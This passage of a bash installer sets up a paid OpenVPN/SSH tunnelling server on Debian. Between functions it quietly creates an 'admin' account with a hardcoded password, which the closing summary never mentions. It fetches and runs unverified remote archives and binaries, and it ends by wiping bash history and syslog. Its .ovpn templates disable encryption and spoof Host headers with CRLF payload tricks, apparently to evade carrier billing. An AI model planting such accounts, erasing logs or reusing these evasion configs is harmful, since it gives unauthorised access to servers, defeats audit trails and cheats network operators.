sed -i "s|Squid_Proxy_2|$Squid_Port2|g" "/etc/systemd/system/ohpovpn.service"
sed -i "s|IP-ADDRESS|$IPADDR|g" "/etc/systemd/system/ohpovpn.service"
sed -i "s|Dropbear_Port1|$Dropbear_Port1|g" "/etc/systemd/system/ohpovpn.service"

#adding autorecon socks
cat <<'socks1' > /etc/systemd/system/ohpsocks1.service
[Unit]
Description=Daemonize Socks1 Autorecon
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/bin/python /home/proxydirect2.py
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
socks1

#adding ovpn autorecon socks
cat <<'socks2' > /etc/systemd/system/ohpsocks2.service
[Unit]
Description=Daemonize Socks2 Autorecon
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/bin/python /home/proxydirect3.py
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
socks2

systemctl daemon-reload
systemctl start socks
systemctl enable socks
systemctl start ohpford
systemctl enable ohpford
systemctl start ohpsocks1
systemctl enable ohpsocks1
systemctl start ohpsocks2
systemctl enable ohpsocks2
systemctl start ohpdropbear
systemctl enable ohpdropbear
systemctl start ohpssh2
systemctl enable ohpssh2
systemctl start ohpovpn
systemctl enable ohpovpn

##creating autorecon script //uncomment if you need autorecon
#cat <<'autorecon' > /home/jftvrecon
#sudo systemctl restart ohpssh2
#sudo systemctl restart ohpsocks1
#sudo systemctl restart ohpsocks2
#sleep 60
#sudo systemctl restart ohpssh2
#sudo systemctl restart ohpsocks1
#sudo systemctl restart ohpsocks2
#
#autorecon
#
##adding autorecon cron
#cat <<'autorecon2' > /etc/cron.d/autorecon
#*/2 *   * * *   root    bash jftvrecon
#autorecon2



}

function OvpnConfigs(){
 # Creating nginx config for our ovpn config downloads webserver
 cat <<'myNginxC' > /etc/nginx/conf.d/johnfordtv-ovpn-config.conf
# My OpenVPN Config Download Directory
server {
 listen 0.0.0.0:myNginx;
 server_name localhost;
 root /var/www/openvpn;
 index index.html;
}
myNginxC

 # Setting our nginx config port for .ovpn download site
 sed -i "s|myNginx|$OvpnDownload_Port|g" /etc/nginx/conf.d/johnfordtv-ovpn-config.conf

 # Removing Default nginx page(port 80)
 rm -rf /etc/nginx/sites-*

 # Now creating all of our OpenVPN Configs 


cat <<EOF16> /var/www/openvpn/tcp-default.ovpn
# Al-amin Sarker's VPN Premium Script
# Â© facebook.com/alaminbd17
# Official Repository: https://facebook.com/alaminbd17
# For Donations, Im accepting prepaid loads or GCash transactions:
# Smart: 09206200840
# Thanks for using this script, Enjoy Highspeed OpenVPN Service
client
dev tun
proto tcp
setenv FRIENDLY_NAME "DebianVPN TCP"
remote $IPADDR $OpenVPN_TCP_Port
remote-cert-tls server
connect-retry infinite
resolv-retry infinite
nobind
persist-key
persist-tun
auth-user-pass
auth none
auth-nocache
cipher none
comp-lzo
redirect-gateway def1
setenv CLIENT_CERT 0
reneg-sec 0
verb 1
http-proxy $IPADDR $Squid_Port1

<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF16

cat <<EOF162> /var/www/openvpn/udp-default.ovpn
# Al-amin Sarker's VPN Premium Script
# Â© facebook.com/alaminbd17
# Official Repository: https://facebook.com/alaminbd17
# For Donations, Im accepting prepaid loads or GCash transactions:
# Smart: 09206200840
# Thanks for using this script, Enjoy Highspeed OpenVPN Service
client
dev tun
proto udp
setenv FRIENDLY_NAME "DebianVPN UDP"
remote $IPADDR $OpenVPN_UDP_Port
remote-cert-tls server
resolv-retry infinite
float
fast-io
nobind
persist-key
persist-remote-ip
persist-tun
auth-user-pass
auth none
auth-nocache
cipher none
comp-lzo
redirect-gateway def1
setenv CLIENT_CERT 0
reneg-sec 0
verb 1

<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF162


cat <<EOF103> /var/www/openvpn/tcp-ohp.ovpn
# Al-amin Sarker's VPN Premium Script
# Â© facebook.com/alaminbd17
# Official Repository: https://facebook.com/alaminbd17
# For Donations, Im accepting prepaid loads or GCash transactions:
# Smart: 09206200840
# Thanks for using this script, Enjoy Highspeed OpenVPN Service
client
dev tun
persist-tun
proto tcp

# We can play this one, put any host on the line
# remote anyhost.com anyport
# remote www.google.com.ph 443
#
# We can also play with CRLFs
#remote "HEAD https://ajax.googleapis.com HTTP/1.1/r/n/r/n"
# Every types of Broken remote line setups/crlfs/payload are accepted, just put them inside of double-quotes
remote "https://www.onetrust.com"
## use this line to modify OpenVPN remote port (this will serve as our fake ovpn port)
port 443

# This proxy uses as our main forwarder for OpenVPN tunnel.
http-proxy IP-ADDRESS OpenVPN_TCP_OHP

# We can also play our request headers here, everything are accepted, put them inside of a double-quotes.
http-proxy-option VERSION 1.1
http-proxy-option CUSTOM-HEADER ""
http-proxy-option CUSTOM-HEADER "Host: www.onetrust.com%2F"
http-proxy-option CUSTOM-HEADER "X-Forwarded-Host: www.digicert.net%2F"
http-proxy-option CUSTOM-HEADER ""

persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
auth-user-pass

<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF103

sed -i "s|IP-ADDRESS|$IPADDR|g" "/var/www/openvpn/tcp-ohp.ovpn"
sed -i "s|OpenVPN_TCP_OHP|$OpenVPN_TCP_OHP|g" "/var/www/openvpn/tcp-ohp.ovpn"


 # Creating OVPN download site index.html
 
 wget -O /var/www/openvpn/index.html "https://raw.githubusercontent.com/Alaminbd257/AlaminMixFiles/main/downloadpage"
 
 # Setting template's correct name,IP address and nginx Port
 sed -i "s|NGINXPORT|$OvpnDownload_Port|g" /var/www/openvpn/index.html
 sed -i "s|IP-ADDRESS|$IPADDR|g" /var/www/openvpn/index.html

 # Restarting nginx service
 systemctl restart nginx
 
 #Modifying Multilogin Script
cat <<'Multilogin' >/usr/local/sbin/set_multilogin_autokill_lib
#!/bin/bash

. /etc/openvpn/script/config.sh

clear

MAX=1
if [ -e "/var/log/auth.log" ]; then
        OS=1;
        LOG="/var/log/auth.log";
fi
if [ -e "/var/log/secure" ]; then
        OS=2;
        LOG="/var/log/secure";
fi

if [ $OS -eq 1 ]; then
	service ssh restart > /dev/null 2>&1;
fi
if [ $OS -eq 2 ]; then
	service sshd restart > /dev/null 2>&1;
fi
	service dropbear restart > /dev/null 2>&1;
				
if [[ ${1+x} ]]; then
        MAX=$1;
fi

        cat /etc/passwd | grep "/home/" | cut -d":" -f1 > /root/user.txt
        username1=( `cat "/root/user.txt" `);
        i="0";
        for user in "${username1[@]}"
			do
                username[$i]=`echo $user | sed 's/'\''//g'`;
                jumlah[$i]=0;
                i=$i+1;
			done
        cat $LOG | grep -i dropbear | grep -i "Password auth succeeded" > /tmp/log-db.txt
        proc=( `ps aux | grep -i dropbear | awk '{print $2}'`);
        for PID in "${proc[@]}"
			do
                cat /tmp/log-db.txt | grep "dropbear\[$PID\]" > /tmp/log-db-pid.txt
                NUM=`cat /tmp/log-db-pid.txt | wc -l`;
                USERS=`cat /tmp/log-db-pid.txt | awk '{print $10}' | sed 's/'\''//g'`;
                IP=`cat /tmp/log-db-pid.txt | awk '{print $12}'`;
                if [ $NUM -eq 1 ]; then
                        i=0;
                        for user1 in "${username[@]}"
							do
                                if [ "$USERS" == "$user1" ]; then
                                        jumlah[$i]=`expr ${jumlah[$i]} + 1`;
                                        pid[$i]="${pid[$i]} $PID"
                                fi
                                i=$i+1;
							done
                fi
			done
        cat $LOG | grep -i sshd | grep -i "Accepted password for" > /tmp/log-db.txt
        data=( `ps aux | grep "\[priv\]" | sort -k 72 | awk '{print $2}'`);
        for PID in "${data[@]}"
			do
                cat /tmp/log-db.txt | grep "sshd\[$PID\]" > /tmp/log-db-pid.txt;
                NUM=`cat /tmp/log-db-pid.txt | wc -l`;
                USERS=`cat /tmp/log-db-pid.txt | awk '{print $9}'`;
                IP=`cat /tmp/log-db-pid.txt | awk '{print $11}'`;
                if [ $NUM -eq 1 ]; then
                        i=0;
                        for user1 in "${username[@]}"
							do
                                if [ "$USERS" == "$user1" ]; then
                                        jumlah[$i]=`expr ${jumlah[$i]} + 1`;
                                        pid[$i]="${pid[$i]} $PID"
                                fi
                                i=$i+1;
							done
                fi
        done
        j="0";
        for i in ${!username[*]}
			do
                if [ ${jumlah[$i]} -gt $MAX ]; then
                        date=`date +"%Y-%m-%d %X"`;
                        USERNAME=${username[$i]};
                        echo "$date - ${username[$i]} - ${jumlah[$i]}";
                        echo "$date - ${username[$i]} - ${jumlah[$i]}" >> /root/log-limit.txt;
                        kill ${pid[$i]};
                        pid[$i]="";
                        j=`expr $j + 1`;
                        
                fi
			done
        if [ $j -gt 0 ]; then
                if [ $OS -eq 1 ]; then
                        service ssh restart > /dev/null 2>&1;
                fi
                if [ $OS -eq 2 ]; then
                        service sshd restart > /dev/null 2>&1;
                fi
                service dropbear restart > /dev/null 2>&1;
                j=0;
		fi
Multilogin

chmod +x /usr/local/sbin/set_multilogin_autokill_lib
 
 # Creating all .ovpn config archives
 cd /var/www/openvpn
 zip -qq -r configs.zip *.ovpn
 cd
}

function ip_address(){
  local IP="$( ip addr | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | egrep -v "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipv4.icanhazip.com )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipinfo.io/ip )"
  [ ! -z "${IP}" ] && echo "${IP}" || echo
} 
IPADDR="$(ip_address)"
MYIP2="s/xxxxxxxxx/$IPADDR/g"

function ConfStartup(){
 # Daily reboot time of our machine
 # For cron commands, visit https://crontab.guru
 echo -e "0 4\t* * *\troot\treboot" > /etc/cron.d/b_reboot_job
 echo -e "* * * * * root /bin/bash /root/auto-active.sh" > /etc/cron.d/auto_active
 echo -e "* * * * * root /bin/bash /root/auto-not-active.sh" > /etc/cron.d/auto_not_active
 echo -e "* *\t* * *\troot\t php -q /etc/$Filename_alias.cron.php" > "/etc/cron.d/$Filename_alias"
 echo -e "* *\t* * *\troot\t bash /etc/openvpn/active.sh" >> "/etc/cron.d/$Filename_alias"
 echo -e "* *\t* * *\troot\t bash /etc/openvpn/inactive.sh" >> "/etc/cron.d/$Filename_alias"
 echo -e "* *\t* * *\troot\t bash /etc/openvpn/deleted.sh" >> "/etc/cron.d/$Filename_alias"
 echo -e "* * * * *  root /usr/local/sbin/set_multilogin_autokill_lib 1" >> "/etc/cron.d/set_multilogin_autokill_lib"
 
 # Creating directory for startup script
 rm -rf /etc/johnfordtv
 mkdir -p /etc/johnfordtv
 chmod -R 755 /etc/johnfordtv
 
 # Creating startup script using cat eof tricks
 cat <<'EOFSH' > /etc/johnfordtv/startup.sh
#!/bin/bash
# Setting server local time
ln -fs /usr/share/zoneinfo/MyVPS_Time /etc/localtime

# Prevent DOS-like UI when installing using APT (Disabling APT interactive dialog)
export DEBIAN_FRONTEND=noninteractive

# Deleting Expired SSH Accounts
/usr/local/sbin/delete_expired &> /dev/null
exit 0
EOFSH
 chmod +x /etc/johnfordtv/startup.sh
 
 # Setting server local time every time this machine reboots
 sed -i "s|MyVPS_Time|$MyVPS_Time|g" /etc/johnfordtv/startup.sh

 # 
 rm -rf /etc/sysctl.d/99*

 # Setting our startup script to run every machine boots 
 cat <<'FordServ' > /etc/systemd/system/johnfordtv.service
[Unit]
Description=JohnfordTV Startup Script
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/johnfordtv/startup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
FordServ
 chmod +x /etc/systemd/system/johnfordtv.service
 systemctl daemon-reload
 systemctl start johnfordtv
 systemctl enable johnfordtv &> /dev/null
 systemctl enable fail2ban &> /dev/null
 systemctl start fail2ban &> /dev/null

 # Rebooting cron service
 systemctl restart cron
 systemctl enable cron
 
}
 #Create Admin
 useradd -m admin
 echo "admin:itangsagli" | chpasswd

function ConfMenu(){
echo -e " Creating Menu scripts.."

cd /usr/local/sbin/
rm -rf {accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squid3,edit_stunnel4,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock}
wget -q 'https://github.com/Alaminbd257/AlaminMixFiles/blob/main/bashmenu.zip?raw=true'
unzip -qq bashmenu.zip
rm -f bashmenu.zip
chmod +x ./*
dos2unix ./* &> /dev/null
sed -i 's|/etc/squid/squid.conf|/etc/privoxy/config|g' ./*
sed -i 's|http_port|listen-address|g' ./*
cd ~
}

function ScriptMessage(){
 echo -e " [\e[1;32m$MyScriptName VPS Installer\e[0m]"
 echo -e ""
 echo -e " https://fb.com/alaminbd17"
 echo -e "[STC Pay] 0559380554 [PAYPAL] SaudiConnect24@gmail.com"
 echo -e ""
}

function InstBadVPN(){
 # Pull BadVPN Binary 64bit or 32bit
if [ "$(getconf LONG_BIT)" == "64" ]; then
 wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDB/raw/master/Files/Plugins/badvpn-udpgw64"
else
 wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDB/raw/master/Files/Plugins/badvpn-udpgw"
fi
 # Set BadVPN to Start on Boot via .profile
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /root/.profile
 # Change Permission to make it Executable
 chmod +x /usr/bin/badvpn-udpgw
 # Start BadVPN via Screen
 screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
}


#############################################
#############################################
########## Installation Process##############
#############################################
## WARNING: Do not modify or edit anything
## if you did'nt know what to do.
## This part is too sensitive.
#############################################
#############################################

 # First thing to do is check if this machine is Debian
 source /etc/os-release
if [[ "$ID" != 'debian' ]]; then
 ScriptMessage
 echo -e "[\e[1;31mError\e[0m] This script is for Debian only, exiting..." 
 exit 1
fi

 # Now check if our machine is in root user, if not, this script exits
 # If you're on sudo user, run `sudo su -` first before running this script
 if [[ $EUID -ne 0 ]];then
 ScriptMessage
 echo -e "[\e[1;31mError\e[0m] This script must be run as root, exiting..."
 exit 1
fi

 # (For OpenVPN) Checking it this machine have TUN Module, this is the tunneling interface of OpenVPN server
 if [[ ! -e /dev/net/tun ]]; then
 echo -e "[\e[1;31mError\e[0m] You cant use this script without TUN Module installed/embedded in your machine, file a support ticket to your machine admin about this matter"
 echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
 exit 1
fi

 # Begin Installation by Updating and Upgrading machine and then Installing all our wanted packages/services to be install.
 InstCategory
 ScriptMessage
 sleep 2
 InstUpdates
 
 # Configure OpenSSH and Dropbear
 echo -e "Configuring ssh..."
 InstSSH
 
 # Configure Stunnel
 echo -e "Configuring apache2..."
 InstApache
 
 # Configure Stunnel
 echo -e "Configuring stunnel..."
 InsStunnel
 
 # Configure BadVPN UDPGW
 echo -e "Configuring BadVPN UDPGW..."
 InstBadVPN
 
 # Configure Webmin
 echo -e "Configuring webmin..."
 InstWebmin
 
 # Configure Squid
 echo -e "Configuring proxy..."
 InsProxy
 
 # Configure OpenVPN
 echo -e "Configuring OpenVPN..."
 InsOpenVPN
 InstActiveSRC
 
 # Configuring Nginx OVPN config download site
 OvpnConfigs

 # Some assistance and startup scripts
 ConfStartup

 ## DNS maker plugin for SUN users(for vps script usage only)
 #wget -qO dnsmaker "https://raw.githubusercontent.com/Bonveio/BonvScripts/master/DNSMaster/debian"
 #chmod +x dnsmaker
 #./dnsmaker
 #rm -rf dnsmaker
 #sed -i "s|http-proxy $IPADDR|http-proxy $(cat /tmp/abonv_mydns)|g" /var/www/openvpn/suntu-dns.ovpn
 #sed -i "s|remote $IPADDR|remote $(cat /tmp/abonv_mydns)|g" /var/www/openvpn/sun-tuudp.ovpn
 #curl -4sSL "$(cat /tmp/abonv_mydns_domain)" &> /dev/null
 #mv /tmp/abonv_mydns /etc/bonveio/my_domain_name
 #mv /tmp/abonv_mydns_id /etc/bonveio/my_domain_id
 #rm -rf /tmp/abonv*

 # VPS Menu script v1.0
 ConfMenu
 
 # Setting server local time
 ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime
 
 clear
 cd ~
 
  # Running screenfetch
 wget -O /usr/bin/screenfetch "https://raw.githubusercontent.com/johndesu090/AutoScriptDB/master/Files/Plugins/screenfetch"
 chmod +x /usr/bin/screenfetch
 echo "clear" >> .profile
 echo "screenfetch" >> .profile

 
 # Showing script's banner message
 ScriptMessage
 
 # Showing additional information from installating this script
echo " "
echo "Installation has been completed!!"
echo "--------------------------------------------------------------------------------"
echo "                         Debian Yellow Servers Script                           "
echo "                                 -Al amin Sarker-                                   "
echo "--------------------------------------------------------------------------------"
echo ""  | tee -a log-install.txt
echo "Server Information"  | tee -a log-install.txt
echo "   - Timezone    : Asia/Manila (GMT +8)"  | tee -a log-install.txt
echo "   - Fail2Ban    : [ON]"  | tee -a log-install.txt
echo "   - IPtables    : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot : [ON]"  | tee -a log-install.txt
echo "   - IPv6        : [OFF]"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Application & Port Information"  | tee -a log-install.txt
echo "   - OpenVPN TCP	: $OpenVPN_TCP_Port "   | tee -a log-install.txt
echo "   - OpenVPN UDP	: $OpenVPN_UDP_Port "  | tee -a log-install.txt
echo "   - OpenVPN OHP	: $OpenVPN_TCP_OHP "  | tee -a log-install.txt
echo "   - OpenSSH		: $SSH_Port1, $SSH_Port2 "  | tee -a log-install.txt
echo "   - SSHvia OHP	: $SSH_viaOHP "  | tee -a log-install.txt
echo "   - Dropbear		: $Dropbear_Port1, $Dropbear_Port2"  | tee -a log-install.txt
echo "   - DropbearOHP	: $Dropbear_OHP"  | tee -a log-install.txt
echo "   - Stunnel/SSL 	: $Stunnel_Port1, $Stunnel_Port2"  | tee -a log-install.txt
echo "   - Squid Proxy	: $Squid_Port1 , $Squid_Port2 (limit to IP Server)"  | tee -a log-install.txt
echo "   - SSHviaAuto	: 666 "  | tee -a log-install.txt
echo "   - Socks Proxy	: 80 "  | tee -a log-install.txt
echo "   - Socks Python	: 667 "  | tee -a log-install.txt
echo "   - PySocks  	: 668 "  | tee -a log-install.txt
echo "   - Squid ELITE	: $Squid_Port3 (limit to IP Server)"  | tee -a log-install.txt
echo "   - Privoxy		: $Privoxy_Port1 , $Privoxy_Port2 (limit to IP Server)"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Premium Script Information"  | tee -a log-install.txt
echo "   To display list of commands: menu"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Important Information"  | tee -a log-install.txt
echo "   - Installation Log        : cat /root/log-install.txt"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   - Webmin                  : http://$IPADDR:10000/"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "OpenVPN Configs Download"  | tee -a log-install.txt
echo "   - Download Link           : http://$IPADDR:85/configs.zip"  | tee -a log-install.txt
echo " Al-amin Sarker"  | tee -a log-install.txt
echo " Facebook: https://fb.me/alaminbd17"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo " This script is under project of https://github.com/Alaminbd257/AlaminMixFiles/"  | tee -a log-install.txt
echo " Please Reboot your VPS"

 # Clearing all logs from installation
 rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
 
sleep 5
reboot
exit 1
